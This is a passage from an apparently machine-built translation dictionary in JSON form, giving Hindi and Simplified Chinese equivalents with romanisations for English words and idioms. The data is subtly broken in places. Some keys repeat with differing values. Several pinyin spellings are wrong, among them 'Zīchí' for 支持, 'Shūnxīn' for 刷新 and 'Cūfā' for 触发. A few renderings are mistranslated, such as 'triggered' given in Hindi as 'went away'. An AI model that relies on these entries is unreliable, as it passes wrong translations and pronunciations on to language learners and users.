                "Hindi": "काल्पनिक (Kalpanik)",
                "Chinese (Simplified)": "幻想 (Huànxiǎng)"
            },
            "carpenter": {
                "Hindi": "बढ़ई (Badhai)",
                "Chinese (Simplified)": "木匠 (Mùjiàng)"
            },
            "default": {
                "Hindi": "डिफ़ॉल्ट (Default)",
                "Chinese (Simplified)": "默认 (Mòrèn)"
            },
            "hug": {
                "Hindi": "गले लगाना (Gale Lagana)",
                "Chinese (Simplified)": "拥抱 (Yǒngbào)"
            },
            "post": {
                "Hindi": "पोस्ट (Post)",
                "Chinese (Simplified)": "帖子 (Tiězi)"
            },
            "terms": {
                "Hindi": "शर्तें (Shartein)",
                "Chinese (Simplified)": "条款 (Tiáokuǎn)"
            },
            "contact": {
                "Hindi": "संपर्क (Sampark)",
                "Chinese (Simplified)": "联系 (Liánxì)"
            },
            "upload": {
                "Hindi": "अपलोड (Upload)",
                "Chinese (Simplified)": "上传 (Shàngchuán)"
            },
            "micro": {
                "Hindi": "सूक्ष्म (Sookshm)",
                "Chinese (Simplified)": "微型 (Wēixíng)"
            },
            "official": {
                "Hindi": "आधिकारिक (Aadhikarik)",
                "Chinese (Simplified)": "官方 (Guānfāng)"
            },
            "original": {
                "Hindi": "मूल (Mool)",
                "Chinese (Simplified)": "原始 (Yuánshǐ)"
            },
            "remake": {
                "Hindi": "पुनःनिर्माण (Punah Nirman)",
                "Chinese (Simplified)": "重拍 (Chóng pāi)"
            },
            "structure": {
                "Hindi": "संरचना (Sanrachna)",
                "Chinese (Simplified)": "结构 (Jiégòu)"
            },
            "statue": {
                "Hindi": "मूर्ति (Murti)",
                "Chinese (Simplified)": "雕像 (Diāoxiàng)"
            },
            "iconic": {
                "Hindi": "प्रसिद्ध (Prasiddh)",
                "Chinese (Simplified)": "标志性 (Biāozhìxìng)"
            },
            "sign": {
                "Hindi": "चिन्ह (Chinh)",
                "Chinese (Simplified)": "符号 (Fúhào)"
            },
            "symbol": {
                "Hindi": "प्रतीक (Prateek)",
                "Chinese (Simplified)": "符号 (Fúhào)"
            },
            "locket": {
                "Hindi": "लॉकेट (Locket)",
                "Chinese (Simplified)": "项链盒 (Xiàngliàn hé)"
            },
            "accurate": {
                "Hindi": "सटीक (Sateek)",
                "Chinese (Simplified)": "准确 (Zhǔnquè)"
            },
            "natural": {
                "Hindi": "प्राकृतिक (Praakritik)",
                "Chinese (Simplified)": "自然的 (Zìrán de)"
            },
            "balance": {
                "Hindi": "संतुलन (Santulan)",
                "Chinese (Simplified)": "平衡 (Pínghéng)"
            },
            "cover": {
                "Hindi": "कवर (Cover)",
                "Chinese (Simplified)": "封面 (Fēngmiàn)"
            },
            "coverage": {
                "Hindi": "कवरेज (Coverage)",
                "Chinese (Simplified)": "覆盖范围 (Fùgài fànwéi)"
            },
            "capable": {
                "Hindi": "सक्षम (Saksham)",
                "Chinese (Simplified)": "有能力的 (Yǒu nénglì de)"
            },
            "phrase": {
                "Hindi": "वाक्यांश (Vaakyansh)",
                "Chinese (Simplified)": "短语 (Duǎnyǔ)"
            },
            "idiom": {
                "Hindi": "मुहावरा (Muhavra)",
                "Chinese (Simplified)": "成语 (Chéngyǔ)"
            },
            "include": {
                "Hindi": "शामिल करना (Shamil Karna)",
                "Chinese (Simplified)": "包括 (Bāokuò)"
            },
            "exclude": {
                "Hindi": "बाहर करना (Bahar Karna)",
                "Chinese (Simplified)": "排除 (Páichú)"
            },
            "various": {
                "Hindi": "विभिन्न (Vibhinn)",
                "Chinese (Simplified)": "各种 (Gèzhǒng)"
            },
            "aim": {
                "Hindi": "उद्देश्य (Uddeshya)",
                "Chinese (Simplified)": "目标 (Mùbiāo)"
            },
            "target": {
                "Hindi": "लक्ष्य (Lakshya)",
                "Chinese (Simplified)": "目标 (Mùbiāo)"
            },
            "additional": {
                "Hindi": "अतिरिक्त (Atirikt)",
                "Chinese (Simplified)": "附加的 (Fùjiā de)"
            },
            "extra": {
                "Hindi": "अतिरिक्त (Atirikt)",
                "Chinese (Simplified)": "额外的 (Éwài de)"
            },
            "magic": {
                "Hindi": "जादू (Jadoo)",
                "Chinese (Simplified)": "魔法 (Mófǎ)"
            },
            "magical": {
                "Hindi": "जादुई (Jadooee)",
                "Chinese (Simplified)": "魔幻的 (Móhuàn de)"
            },
            "specific": {
                "Hindi": "विशिष्ट (Vishisht)",
                "Chinese (Simplified)": "具体的 (Jùtǐ de)"
            },
            "common": {
                "Hindi": "सामान्य (Samanya)",
                "Chinese (Simplified)": "普通的 (Pǔtōng de)"
            },
            "unique": {
                "Hindi": "अद्वितीय (Advitiya)",
                "Chinese (Simplified)": "独特的 (Dútè de)"
            },
            "a blessing in disguise": {
                "Hindi": "बुरे में भी अच्छा होता है (Bure mein bhi accha hota hai)",
                "Chinese (Simplified)": "因祸得福 (Yīn huò dé fú)"
            },
            "burn bridges": {
                "Hindi": "रिश्ते तोड़ना (Rishte todna)",
                "Chinese (Simplified)": "断绝关系 (Duànjué guānxi)"
            },
            "a penny for your thoughts": {
                "Hindi": "आप क्या सोच रहे हैं? (Aap kya soch rahe hain?)",
                "Chinese (Simplified)": "你在想什么? (Nǐ zài xiǎng shénme?)"
            },
            "cat's out of the bag": {
                "Hindi": "राज़ खुल गया (Raaz khul gaya)",
                "Chinese (Simplified)": "猫已经从袋子里出来了 (Māo yǐjīng cóng dàizi lǐ chūlái le)"
            },
            "cut to the chase": {
                "Hindi": "साफ़ बात कहो (Saaf baat kaho)",
                "Chinese (Simplified)": "直接进入主题 (Zhíjiē jìnrù zhǔtí)"
            },
            "cry over spilled milk": {
                "Hindi": "बता चुका हुआ काम पर रोना (Bata chuka hua kaam par rona)",
                "Chinese (Simplified)": "为打翻的牛奶哭泣 (Wèi dǎ fān de niúnǎi kūqì)"
            },
            "don't count your chickens before they hatch": {
                "Hindi": "अभी से कुछ ना सोचो (Abhi se kuch na socho)",
                "Chinese (Simplified)": "不要过早下结论 (Bùyào guò zǎo xià jiélùn)"
            },
            "the ball is in your court": {
                "Hindi": "अब यह तुम्हारी बारी है (Ab yeh tumhari baari hai)",
                "Chinese (Simplified)": "球在你这边 (Qiú zài nǐ zhèbiān)"
            },
            "a bird in the hand is worth two in the bush": {
                "Hindi": "जो तुम्हारे पास है वही ज्यादा बेहतर है (Jo tumhare paas hai wahi zyada behtar hai)",
                "Chinese (Simplified)": "手中的鸟胜过林中的两只 (Shǒu zhōng de niǎo shèngguò lín zhōng de liǎng zhī)"
            },
            "to get cold feet": {
                "Hindi": "घबराना (Ghabraana)",
                "Chinese (Simplified)": "感到紧张 (Gǎndào jǐnzhāng)"
            },
            "a blessing in disguise": {
                "Hindi": "बुरे में भी अच्छा होता है (Bure mein bhi accha hota hai)",
                "Chinese (Simplified)": "因祸得福 (Yīn huò dé fú)"
            },
            "actions speak louder than words": {
                "Hindi": "कर्म शब्दों से ज्यादा बोलते हैं (Karm shabdon se zyada bolte hain)",
                "Chinese (Simplified)": "行动胜于言辞 (Xíngdòng shèng yú yáncí)"
            },
            "break the ice": {
                "Hindi": "बर्फ तोड़ना (Baraf todna)",
                "Chinese (Simplified)": "打破僵局 (Dǎ pò jiāngjú)"
            },
            "hit the nail on the head": {
                "Hindi": "सच्चाई को ठीक से कहना (Sachai ko theek se kehna)",
                "Chinese (Simplified)": "一针见血 (Yī zhēn jiàn xiě)"
            },
            "under the weather": {
                "Hindi": "बीमार महसूस करना (Beemar mehsoos karna)",
                "Chinese (Simplified)": "身体不适 (Shēntǐ bù shì)"
            },
            "spill the beans": {
                "Hindi": "राज़ खोलना (Raaz kholna)",
                "Chinese (Simplified)": "泄露秘密 (Xièlòu mìmì)"
            },
            "once in a blue moon": {
                "Hindi": "कभी कभार (Kabhi kabhaar)",
                "Chinese (Simplified)": "千载难逢 (Qiān zǎi nán féng)"
            },
            "burn the midnight oil": {
                "Hindi": "रात भर काम करना (Raat bhar kaam karna)",
                "Chinese (Simplified)": "开夜车 (Kāi yè chē)"
            },
            "beat around the bush": {
                "Hindi": "सीधे मुद्दे की बात न करना (Seedhe mudde ki baat na karna)",
                "Chinese (Simplified)": "拐弯抹角 (Guǎi wān mò jiǎo)"
            },
            "bite the bullet": {
                "Hindi": "मुसीबत को सहना (Musibat ko sehna)",
                "Chinese (Simplified)": "硬着头皮做 (Yìngzhe tóupí zuò)"
            },
            "the early bird catches the worm": {
                "Hindi": "जो जल्दी उठता है उसे फायदा होता है (Jo jaldi uthta hai use faida hota hai)",
                "Chinese (Simplified)": "早起的鸟儿有虫吃 (Zǎo qǐ de niǎo er yǒu huǐ chī)"
            },
            "every cloud has a silver lining": {
                "Hindi": "हर बुरी चीज में कुछ अच्छा होता है (Har buri cheez mein kuch accha hota hai)",
                "Chinese (Simplified)": "黑暗中总有一线光明 (Hēi'àn zhōng zǒng yǒu yī xiàn guāngmíng)"
            },
            "you can't judge a book by its cover": {
                "Hindi": "किसी को बाहर से न आँको (Kisi ko baahar se na aankho)",
                "Chinese (Simplified)": "人不可貌相 (Rén bù kě mào xiàng)"
            },
            "too good to be true": {
                "Hindi": "विश्वास करना कठिन (Vishwas karna kathin)",
                "Chinese (Simplified)": "好得令人难以置信 (Hǎo dé lìng rén nán yǐ zhìxìn)"
            },
            "put all your eggs in one basket": {
                "Hindi": "सभी आशाएँ एक ही जगह लगाना (Sabhi aashaen ek hi jagah lagana)",
                "Chinese (Simplified)": "孤注一掷 (Gū zhù yī zhì)"
            },
            "the apple doesn't fall far from the tree": {
                "Hindi": "बच्चे अपने माता-पिता से मिलते हैं (Bacche apne mata-pita se milte hain)",
                "Chinese (Simplified)": "有其父必有其子 (Yǒu qí fù bì yǒu qí zǐ)"
            },
            "hit the sack": {
                "Hindi": "सोने जाना (Sone jana)",
                "Chinese (Simplified)": "去睡觉 (Qù shuìjiào)"
            },
            "cost an arm and a leg": {
                "Hindi": "बहुत महंगा होना (Bahut mehenga hona)",
                "Chinese (Simplified)": "花费很多 (Huā fèi hěn duō)"
            },
            "raining cats and dogs": {
                "Hindi": "बहुत जोर से बारिश होना (Bahut zor se baarish hona)",
                "Chinese (Simplified)": "倾盆大雨 (Qīngpén dàyǔ)"
            },
            "let the cat out of the bag": {
                "Hindi": "राज़ खोल देना (Raaz khol dena)",
                "Chinese (Simplified)": "泄露秘密 (Xièlòu mìmì)"
            },
            "kill two birds with one stone": {
                "Hindi": "एक तीर से दो शिकार (Ek teer se do shikar)",
                "Chinese (Simplified)": "一箭双雕 (Yī jiàn shuāng diāo)"
            },
            "bite off more than you can chew": {
                "Hindi": "अपनी क्षमता से अधिक काम लेना (Apni kshamata se adhik kaam lena)",
                "Chinese (Simplified)": "贪多嚼不烂 (Tān duō jiáo bù làn)"
            },
            "it's not rocket science": {
                "Hindi": "यह बहुत कठिन नहीं है (Yeh bahut kathin nahi hai)",
                "Chinese (Simplified)": "这不是什么火箭科学 (Zhè bù shì shénme huǒjiàn kēxué)"
            },
            "in the heat of the moment": {
                "Hindi": "जोश में आकर (Josh mein aakar)",
                "Chinese (Simplified)": "一时激动 (Yīshí jīdòng)"
            },
            "the tip of the iceberg": {
                "Hindi": "सिर्फ़ शुरुआत (Sirf shuruat)",
                "Chinese (Simplified)": "冰山一角 (Bīngshān yī jiǎo)"
            },
            "a watched pot never boils": {
                "Hindi": "जो चीज़ देखी जाती है वह जल्दी नहीं होती (Jo cheez dekhi jati hai woh jaldi nahi hoti)",
                "Chinese (Simplified)": "看锅不会开 (Kàn guō bù huì kāi)"
            },
            "out of the frying pan and into the fire": {
                "Hindi": "मुसीबत से और बड़ी मुसीबत में फंसना (Musibat se aur badi musibat mein fansna)",
                "Chinese (Simplified)": "从锅里跳到火里 (Cóng guō lǐ tiào dào huǒ lǐ)"
            },
            "don't cry over spilled milk": {
                "Hindi": "जो हो चुका है उस पर पछतावा मत करो (Jo ho chuka hai us par pachtawa mat karo)",
                "Chinese (Simplified)": "覆水难收 (Fù shuǐ nán shōu)"
            },
            "a picture is worth a thousand words": {
                "Hindi": "एक तस्वीर हजार शब्दों के बराबर होती है (Ek tasveer hazar shabdon ke barabar hoti hai)",
                "Chinese (Simplified)": "一图胜千言 (Yī tú shèng qiān yán)"
            },
            "actions speak louder than words": {
                "Hindi": "कर्म शब्दों से अधिक बोलते हैं (Karm shabdon se adhik bolte hain)",
                "Chinese (Simplified)": "行动胜于言辞 (Xíngdòng shèng yú yáncí)"
            },
            "better late than never": {
                "Hindi": "देरी से आना कभी नहीं आने से बेहतर है (Der se aana kabhi nahi aane se behtar hai)",
                "Chinese (Simplified)": "迟到总比不到好 (Chídào zǒng bǐ bù dào hǎo)"
            },
            "don't bite the hand that feeds you": {
                "Hindi": "जो तुम्हारी मदद करता है उसे नुकसान मत पहुँचाओ (Jo tumhari madad karta hai use nuqsan mat pahuchao)",
                "Chinese (Simplified)": "不要咬那只喂你的人 (Bùyào yǎo nà zhī wèi nǐ de rén)"
            },
            "burning the midnight oil": {
                "Hindi": "रातों को जागकर काम करना (Raaton ko jaagkar kaam karna)",
                "Chinese (Simplified)": "熬夜 (Áo yè)"
            },
            "hit the nail on the head": {
                "Hindi": "सही बात कहना (Sahi baat kehna)",
                "Chinese (Simplified)": "一针见血 (Yī zhēn jiàn xuè)"
            },
            "a bird in the hand is worth two in the bush": {
                "Hindi": "जो है वही बेहतर है (Jo hai wahi behtar hai)",
                "Chinese (Simplified)": "一鸟在手胜过二鸟在林 (Yī niǎo zài shǒu shèngguò èr niǎo zài lín)"
            },
            "rome wasn't built in a day": {
                "Hindi": "कुछ भी बड़ी चीज़ जल्दी नहीं बनती (Kuch bhi badi cheez jaldi nahi banti)",
                "Chinese (Simplified)": "罗马不是一天建成的 (Luómǎ bù shì yī tiān jiànchéng de)"
            },
            "the grass is always greener on the other side": {
                "Hindi": "दूसरों के पास जो है वह हमेशा बेहतर लगता है (Doosron ke paas jo hai wah hamesha behtar lagta hai)",
                "Chinese (Simplified)": "别人的草地总是更绿 (Biérén de cǎodì zǒng shì gèng lǜ)"
            },
            "a leopard can't change its spots": {
                "Hindi": "व्यक्ति का स्वभाव नहीं बदलता (Vyakti ka swabhav nahi badalta)",
                "Chinese (Simplified)": "本性难移 (Běnxìng nán yí)"
            },
            "put your money where your mouth is": {
                "Hindi": "जो कहो वह करो (Jo kaho wah karo)",
                "Chinese (Simplified)": "言行一致 (Yánxíng yīzhì)"
            },
            "the ball is in your court": {
                "Hindi": "अब तुम्हारी बारी है (Ab tumhari baari hai)",
                "Chinese (Simplified)": "球在你这边 (Qiú zài nǐ zhèbiān)"
            },
            "don't count your chickens before they hatch": {
                "Hindi": "अभी से खुशी मत मनाओ (Abhi se khushi mat manao)",
                "Chinese (Simplified)": "不要过早打算 (Bùyào guòzǎo dǎsuàn)"
            },
            "a watched pot never boils": {
                "Hindi": "जल्दी मत करो (Jaldi mat karo)",
                "Chinese (Simplified)": "看锅永远不会沸腾 (Kàn guō yǒngyuǎn bù huì fèiténg)"
            },
            "mafia": {
                "Hindi": "माफिया (Mafia)",
                "Chinese (Simplified)": "黑手党 (Hēi shǒu dǎng)"
            },
            "witch": {
                "Hindi": "जादूगरनी (Jadoogarni)",
                "Chinese (Simplified)": "女巫 (Nǚwū)"
            },
            "dope": {
                "Hindi": "नशा (Nasha)",
                "Chinese (Simplified)": "毒品 (Dúpǐn)"
            },
            "crop": {
                "Hindi": "फसल (Fasal)",
                "Chinese (Simplified)": "农作物 (Nóngzuòwù)"
            },
            "seat": {
                "Hindi": "सीट (Seat)",
                "Chinese (Simplified)": "座位 (Zuòwèi)"
            },
            "prepare": {
                "Hindi": "तैयार करना (Taiyaar Karna)",
                "Chinese (Simplified)": "准备 (Zhǔnbèi)"
            },
            "engine": {
                "Hindi": "इंजन (Engine)",
                "Chinese (Simplified)": "引擎 (Yǐnqíng)"
            },
            "kick": {
                "Hindi": "लात (Laat)",
                "Chinese (Simplified)": "踢 (Tī)"
            },
            "procedure": {
                "Hindi": "प्रक्रिया (Prakriya)",
                "Chinese (Simplified)": "程序 (Chéngxù)"
            },
            "tame": {
                "Hindi": "पालना (Paala)",
                "Chinese (Simplified)": "驯服 (Xùnfú)"
            },
            "early": {
                "Hindi": "जल्दी (Jaldi)",
                "Chinese (Simplified)": "早 (Zǎo)"
            },
            "time pass": {
                "Hindi": "समय बिताना (Samay bitana)",
                "Chinese (Simplified)": "消磨时间 (Xiāo mó shíjiān)"
            },
            "creature": {
                "Hindi": "प्राणी (PraaNi)",
                "Chinese (Simplified)": "生物 (Shēngwù)"
            },
            "prison": {
                "Hindi": "जेल (Jail)",
                "Chinese (Simplified)": "监狱 (Jiānyù)"
            },
            "charges": {
                "Hindi": "आरोप (Aarop)",
                "Chinese (Simplified)": "指控 (Zhǐkòng)"
            },
            "imprisonment": {
                "Hindi": "कारावास (Kaarawaas)",
                "Chinese (Simplified)": "监禁 (Jiānjìn)"
            },
            "demand": {
                "Hindi": "मांग (Maang)",
                "Chinese (Simplified)": "需求 (Xūqiú)"
            },
            "reply": {
                "Hindi": "उत्तर (Uttar)",
                "Chinese (Simplified)": "回复 (Huífù)"
            },
            "boycott": {
                "Hindi": "बहिष्कार (Bahishkaar)",
                "Chinese (Simplified)": "抵制 (Dǐzhì)"
            },
            "biceps": {
                "Hindi": "बाइसेप्स (Biceps)",
                "Chinese (Simplified)": "肱二头肌 (Gōng èr tóu jī)"
            },
            "shameful": {
                "Hindi": "लज्जाजनक (Lajjajanak)",
                "Chinese (Simplified)": "可耻 (Kěchǐ)"
            },
            "shot him": {
                "Hindi": "उसे गोली मारी (Use goli maari)",
                "Chinese (Simplified)": "射击他 (Shèjí tā)"
            },
            "shoot her": {
                "Hindi": "उसे गोली मारो (Use goli maaro)",
                "Chinese (Simplified)": "射击她 (Shèjí tā)"
            },
            "shoot them": {
                "Hindi": "उन्हें गोली मारो (Unhein goli maaro)",
                "Chinese (Simplified)": "射击他们 (Shèjí tāmen)"
            },
            "creepy": {
                "Hindi": "भयानक (Bhayaank)",
                "Chinese (Simplified)": "令人毛骨悚然 (Lìng rén máo gǔ sǒng rán)"
            },
            "buzz": {
                "Hindi": "गूँज (Goonj)",
                "Chinese (Simplified)": "嗡嗡声 (Wēng wēng shēng)"
            },
            "wave": {
                "Hindi": "लहर (Lahar)",
                "Chinese (Simplified)": "波浪 (Bōlàng)"
            },
            "butter": {
                "Hindi": "मक्खन (Makkhan)",
                "Chinese (Simplified)": "黄油 (Huángyóu)"
            },
            "yet to come": {
                "Hindi": "आना बाकी है (Aana baaki hai)",
                "Chinese (Simplified)": "还未到来 (Hái wèi dàolái)"
            },
            "self love": {
                "Hindi": "स्वयं प्रेम (Swayam prem)",
                "Chinese (Simplified)": "自爱 (Zì ài)"
            },
            "fragile": {
                "Hindi": "नाजुक (Naazuk)",
                "Chinese (Simplified)": "易碎 (Yì suì)"
            },
            "antifragile": {
                "Hindi": "एंटी-फ्रैजाइल (Anti-fragile)",
                "Chinese (Simplified)": "抗脆弱 (Kàng cuìruò)"
            },
            "praise the lord": {
                "Hindi": "प्रभु की प्रशंसा करो (Prabhu ki prashansa karo)",
                "Chinese (Simplified)": "赞美上帝 (Zànměi shàngdì)"
            },
            "out of control": {
                "Hindi": "नियंत्रण से बाहर (Niyantran se baahar)",
                "Chinese (Simplified)": "失控 (Shīkòng)"
            },
            "ambition": {
                "Hindi": "महत्वाकांक्षा (Mahattvakansha)",
                "Chinese (Simplified)": "雄心 (Xióngxīn)"
            },
            "kush": {
                "Hindi": "कुश (Kush)",
                "Chinese (Simplified)": "大麻 (Dàmá)"
            },
            "lush": {
                "Hindi": "हरा-भरा (Hara-bhara)",
                "Chinese (Simplified)": "茂盛 (Màoshèng)"
            },
            "coma": {
                "Hindi": "कोमा (Coma)",
                "Chinese (Simplified)": "昏迷 (Hūnmí)"
            },
            "still": {
                "Hindi": "अभी भी (Abhi bhi)",
                "Chinese (Simplified)": "仍然 (Réngrán)"
            },
            "deep": {
                "Hindi": "गहरा (Gehra)",
                "Chinese (Simplified)": "深 (Shēn)"
            },
            "dose": {
                "Hindi": "खुराक (Khuraak)",
                "Chinese (Simplified)": "剂量 (Jìliàng)"
            },
            "bet": {
                "Hindi": "सट्टा (Satta)",
                "Chinese (Simplified)": "打赌 (Dǎdǔ)"
            },
            "you like that": {
                "Hindi": "क्या तुम्हें वह पसंद है (Kya tumhein wah pasand hai)",
                "Chinese (Simplified)": "你喜欢那个 (Nǐ xǐhuān nàgè)"
            },
            "boys like you": {
                "Hindi": "लड़के तुमसे प्यार करते हैं (Ladke tumse pyaar karte hain)",
                "Chinese (Simplified)": "男孩喜欢你 (Nán hái xǐhuān nǐ)"
            },
            "girls like you": {
                "Hindi": "लड़कियाँ तुमसे प्यार करती हैं (Ladkiyaan tumse pyaar karti hain)",
                "Chinese (Simplified)": "女孩喜欢你 (Nǚhái xǐhuān nǐ)"
            },
            "love it": {
                "Hindi": "इसे प्यार करो (Ise pyaar karo)",
                "Chinese (Simplified)": "爱它 (Ài tā)"
            },
            "exclusive": {
                "Hindi": "विशेष (Vishesh)",
                "Chinese (Simplified)": "独家 (Dújiā)"
            },
            "biscuit": {
                "Hindi": "बिस्किट (Biscuit)",
                "Chinese (Simplified)": "饼干 (Bǐnggān)"
            },
            "cookie": {
                "Hindi": "कुकी (Cookie)",
                "Chinese (Simplified)": "曲奇 (Qūqí)"
            },
            "calm down": {
                "Hindi": "शांत हो जाओ (Shaant ho jao)",
                "Chinese (Simplified)": "冷静下来 (Lěngjìng xiàlái)"
            },
            "far from death": {
                "Hindi": "मृत्यु से दूर (Mrityu se door)",
                "Chinese (Simplified)": "远离死亡 (Yuǎnlí sǐwáng)"
            },
            "far from alive": {
                "Hindi": "जीवन से दूर (Jeevan se door)",
                "Chinese (Simplified)": "远离活着 (Yuǎnlí huózhe)"
            },
            "edge": {
                "Hindi": "किनारा (Kinara)",
                "Chinese (Simplified)": "边缘 (Biānyuán)"
            },
            "ready or not": {
                "Hindi": "तैयार हो या नहीं (Taiyaar ho ya nahin)",
                "Chinese (Simplified)": "准备好还是没准备 (Zhǔnbèi hǎo háishì méi zhǔnbèi)"
            },
            "on my way": {
                "Hindi": "मैं रास्ते में हूँ (Main raaste mein hoon)",
                "Chinese (Simplified)": "在路上 (Zài lùshàng)"
            },
            "coming down": {
                "Hindi": "नीचे आ रहा है (Neeche aa raha hai)",
                "Chinese (Simplified)": "下来 (Xiàlái)"
            },
            "myself": {
                "Hindi": "खुद (Khud)",
                "Chinese (Simplified)": "我自己 (Wǒ zìjǐ)"
            },
            "best friend": {
                "Hindi": "सबसे अच्छा दोस्त (Sabse accha dost)",
                "Chinese (Simplified)": "最好的朋友 (Zuì hǎo de péngyǒu)"
            },
            "boyfriend": {
                "Hindi": "प्रेमी (Premi)",
                "Chinese (Simplified)": "男朋友 (Nán péngyǒu)"
            },
            "girlfriend": {
                "Hindi": "प्रेमिका (Premika)",
                "Chinese (Simplified)": "女朋友 (Nǚ péngyǒu)"
            },
            "shutdown": {
                "Hindi": "बंद करना (Band karna)",
                "Chinese (Simplified)": "关机 (Guānjī)"
            },
            "shut up": {
                "Hindi": "चुप रहो (Chup raho)",
                "Chinese (Simplified)": "闭嘴 (Bìzuǐ)"
            },
            "startup": {
                "Hindi": "शुरुआत (Shuruaat)",
                "Chinese (Simplified)": "启动 (Qǐdòng)"
            },
            "forgiven": {
                "Hindi": "क्षमा किया गया (Kshama kiya gaya)",
                "Chinese (Simplified)": "被原谅 (Bèi yuánliàng)"
            },
            "unforgiven": {
                "Hindi": "अक्षम्य (Akshamya)",
                "Chinese (Simplified)": "不可原谅 (Bùkě yuánliàng)"
            },
            "welcome there": {
                "Hindi": "वहां स्वागत है (Wahan swaagat hai)",
                "Chinese (Simplified)": "欢迎在那里 (Huānyíng zài nàlǐ)"
            },
            "welcome here": {
                "Hindi": "यहाँ स्वागत है (Yahan swaagat hai)",
                "Chinese (Simplified)": "欢迎在这里 (Huānyíng zài zhèlǐ)"
            },
            "forgive": {
                "Hindi": "क्षमा करना (Kshama karna)",
                "Chinese (Simplified)": "原谅 (Yuánliàng)"
            },
            "punish": {
                "Hindi": "दंड देना (Dand dena)",
                "Chinese (Simplified)": "惩罚 (Chéngfá)"
            },
            "punishment": {
                "Hindi": "दंड (Dand)",
                "Chinese (Simplified)": "惩罚 (Chéngfá)"
            },
            "despite": {
                "Hindi": "के बावजूद (Ke bavajood)",
                "Chinese (Simplified)": "尽管 (Jǐnguǎn)"
            },
            "bargain": {
                "Hindi": "सौदा (Sauda)",
                "Chinese (Simplified)": "讨价还价 (Tǎojià huányjià)"
            },
            "award": {
                "Hindi": "पुरस्कार (Puraskar)",
                "Chinese (Simplified)": "奖项 (Jiǎngxiàng)"
            },
            "tail": {
                "Hindi": "पूंछ (Poonch)",
                "Chinese (Simplified)": "尾巴 (Wěibā)"
            },
            "subtle": {
                "Hindi": "सूक्ष्म (Sookshm)",
                "Chinese (Simplified)": "微妙 (Wēimiào)"
            },
            "celebrity": {
                "Hindi": "सेलिब्रिटी (Selibriti)",
                "Chinese (Simplified)": "名人 (Míngrén)"
            },
            "celebrities": {
                "Hindi": "सेलिब्रिटीज़ (Selibritiz)",
                "Chinese (Simplified)": "名人们 (Míngrénmen)"
            },
            "junk": {
                "Hindi": "कबाड़ (Kabaad)",
                "Chinese (Simplified)": "垃圾 (Lājī)"
            },
            "debunk": {
                "Hindi": "ख़ारिज करना (Khaarij karna)",
                "Chinese (Simplified)": "揭穿 (Jiēchuān)"
            },
            "react": {
                "Hindi": "प्रतिक्रिया करना (Pratikriya karna)",
                "Chinese (Simplified)": "反应 (Fǎnyìng)"
            },
            "reaction": {
                "Hindi": "प्रतिक्रिया (Pratikriya)",
                "Chinese (Simplified)": "反应 (Fǎnyìng)"
            },
            "realistic": {
                "Hindi": "यथार्थवादी (Yatharthvadi)",
                "Chinese (Simplified)": "现实主义的 (Xiànshízhǔyì de)"
            },
            "thought": {
                "Hindi": "विचार (Vichaar)",
                "Chinese (Simplified)": "想法 (Xiǎngfǎ)"
            },
            "moment": {
                "Hindi": "क्षण (Kshan)",
                "Chinese (Simplified)": "时刻 (Shíkè)"
            },
            "movement": {
                "Hindi": "आंदोलन (Aandolan)",
                "Chinese (Simplified)": "运动 (Yùndòng)"
            },
            "sensitive": {
                "Hindi": "संवेदनशील (Sanvedansheel)",
                "Chinese (Simplified)": "敏感的 (Mǐngǎn de)"
            },
            "insensitive": {
                "Hindi": "असंवेदनशील (Asanvedansheel)",
                "Chinese (Simplified)": "不敏感的 (Bù mǐngǎn de)"
            },
            "accent": {
                "Hindi": "उच्चारण (Ucchaaran)",
                "Chinese (Simplified)": "口音 (Kǒuyīn)"
            },
            "brilliant": {
                "Hindi": "प्रतिभाशाली (Pratbhaashaali)",
                "Chinese (Simplified)": "杰出的 (Jiéchū de)"
            },
            "threaten": {
                "Hindi": "धमकाना (Dhamakaana)",
                "Chinese (Simplified)": "威胁 (Wēixié)"
            },
            "become": {
                "Hindi": "बनना (Bannaa)",
                "Chinese (Simplified)": "成为 (Chéngwéi)"
            },
            "health": {
                "Hindi": "स्वास्थ्य (Swaasthya)",
                "Chinese (Simplified)": "健康 (Jiànkāng)"
            },
            "health minister": {
                "Hindi": "स्वास्थ्य मंत्री (Swaasthya Mantri)",
                "Chinese (Simplified)": "卫生部长 (Wèishēng bùzhǎng)"
            },
            "support": {
                "Hindi": "समर्थन (Samarthan)",
                "Chinese (Simplified)": "支持 (Zīchí)"
            },
            "arrive": {
                "Hindi": "आना (Aana)",
                "Chinese (Simplified)": "到达 (Dàodá)"
            },
            "shape": {
                "Chinese (Simplified)": "形状 (xíng zhuàng)",
                "Hindi": "आकृति (aakriti)"
            },
            "tape": {
                "Chinese (Simplified)": "胶带 (jiāo dài)",
                "Hindi": "टेप (tep)"
            },
            "cape": {
                "Chinese (Simplified)": "斗篷 (dǒu péng)",
                "Hindi": "लबादा (labaada)"
            },
            "nap": {
                "Chinese (Simplified)": "小睡 (xiǎo shuì)",
                "Hindi": "झपकी (jhapki)"
            },
            "depart": {
                "Hindi": "प्रस्थान करना (Prasthaan karna)",
                "Chinese (Simplified)": "离开 (Líkāi)"
            },
            "export": {
                "Hindi": "निर्यात (Niryaat)",
                "Chinese (Simplified)": "出口 (Chūkǒu)"
            },
            "import": {
                "Hindi": "आयात (Aayaat)",
                "Chinese (Simplified)": "进口 (Jìnkǒu)"
            },
            "fresh": {
                "Hindi": "ताजा (Taaja)",
                "Chinese (Simplified)": "新鲜的 (Xīnxiān de)"
            },
            "refresh": {
                "Hindi": "ताज़ा करना (Taaza karna)",
                "Chinese (Simplified)": "刷新 (Shūnxīn)"
            },
            "carry": {
                "Hindi": "ले जाना (Le jaana)",
                "Chinese (Simplified)": "携带 (Xiédài)"
            },
            "turn": {
                "Hindi": "मुड़ना (Mudna)",
                "Chinese (Simplified)": "转弯 (Zhuǎnwān)"
            },
            "turn left": {
                "Hindi": "बाएँ मुड़ें (Baen muden)",
                "Chinese (Simplified)": "左转 (Zuǒ zhuǎn)"
            },
            "turn right": {
                "Hindi": "दाएँ मुड़ें (Daen muden)",
                "Chinese (Simplified)": "右转 (Yòu zhuǎn)"
            },
            "able": {
                "Hindi": "सक्षम (Sakshyam)",
                "Chinese (Simplified)": "能够 (Nénggòu)"
            },
            "pack": {
                "Hindi": "पैक करना (Paek karna)",
                "Chinese (Simplified)": "打包 (Dǎbāo)"
            },
            "triggered": {
                "Hindi": "चला गया (Chala gaya)",
                "Chinese (Simplified)": "触发 (Cūfā)"
            },
            "trigger": {
                "Hindi": "चलाना (Chalaana)",
                "Chinese (Simplified)": "触发 (Cūfā)"
            },
            "spin": {
                "Hindi": "घूमना (Ghoomna)",
                "Chinese (Simplified)": "旋转 (Xuànzhuǎn)"
            },
            "destroy": {
